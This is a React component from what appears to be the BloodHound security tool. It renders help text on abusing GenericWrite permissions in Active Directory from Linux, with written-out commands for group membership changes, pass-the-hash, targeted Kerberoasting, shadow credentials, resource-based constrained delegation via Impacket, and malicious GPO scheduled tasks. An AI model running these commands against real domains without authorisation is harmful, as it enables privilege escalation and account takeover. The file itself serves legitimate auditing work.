// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Link, Typography } from '@mui/material';
import { EdgeInfoProps } from '../index';

const LinuxAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetType }) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite to a group allows you to directly modify group membership of the group.
                    </Typography>

                    <Typography variant='body2'>
                        Use samba's net tool to add the user to the target group. The credentials can be supplied in
                        cleartext or prompted interactively if omitted from the command line:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        It can also be done with pass-the-hash using{' '}
                        <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
                            pth-toolkit's net tool
                        </Link>
                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Finally, verify that the user was successfully added to the group:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>
                </>
            );
        case 'User':
            return (
                <>
                    <Typography variant='body1'> Targeted Kerberoast </Typography>

                    <Typography variant='body2'>
                        A targeted kerberoast attack can be performed using{' '}
                        <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/targetedKerberoast'>
                            targetedKerberoast.py
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}
                    </Typography>

                    <Typography variant='body2'>
                        The tool will automatically attempt a targetedKerberoast attack, either on all users or against
                        a specific one if specified in the command line, and then obtain a crackable hash. The cleanup
                        is done automatically as well.
                    </Typography>

                    <Typography variant='body2'>
                        The recovered hash can be cracked offline using the tool of your choice.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>
                        To abuse this permission, use{' '}
                        <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/pywhisker'>
                            pyWhisker
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the pyWhisker documentation.
                    </Typography>
                </>
            );
        case 'Computer':
            return (
                <>
                    <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                    <Typography variant='body2'>
                        First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                        computer account can be added with Impacket's addcomputer.py example script:
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        We now need to configure the target object so that the attacker-controlled computer can delegate
                        to it. Impacket's rbcd.py script can be used for that purpose:
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        And finally we can get a service ticket for the service name (sname) we want to "pretend" to be
                        "admin" for. Impacket's getST.py example script can be used for that purpose.
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of
                        the TARGETCOMPUTER.
                    </Typography>
                    <Typography variant='body1'> Shadow Credentials attack </Typography>
                    <Typography variant='body2'>
                        To abuse this permission, use{' '}
                        <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/pywhisker'>
                            pyWhisker
                        </Link>
                        .
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                        }
                    </Typography>
                    <Typography variant='body2'>
                        For other optional parameters, view the pyWhisker documentation.
                    </Typography>
                </>
            );
        case 'GPO':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite over a GPO, you may make modifications to that GPO which will then apply to
                        the users and computers affected by the GPO. Select the target object you wish to push an evil
                        policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows
                        item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the
                        group policy client to pick up and execute the new evil policy. See the references tab for a
                        more detailed write up on this abuse.
                    </Typography>

                    <Typography variant='body2'>
                        <Link target='_blank' rel='noopener' href='https://github.com/Hackndo/pyGPOAbuse'>
                            pyGPOAbuse.py
                        </Link>{' '}
                        can be used for that purpose.
                    </Typography>
                    <Typography variant='body2'>
                        This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with
                        'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to
                        add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for
                        the given GPO. Therefore, you need write access to child objects of this folder or create child
                        objects permission. The security descriptor of the GPO is reflected on the folder, meaning
                        permissions to write child items on the GPO are required.
                    </Typography>
                </>
            );
        default:
            return null;
    }
};

export default LinuxAbuse;
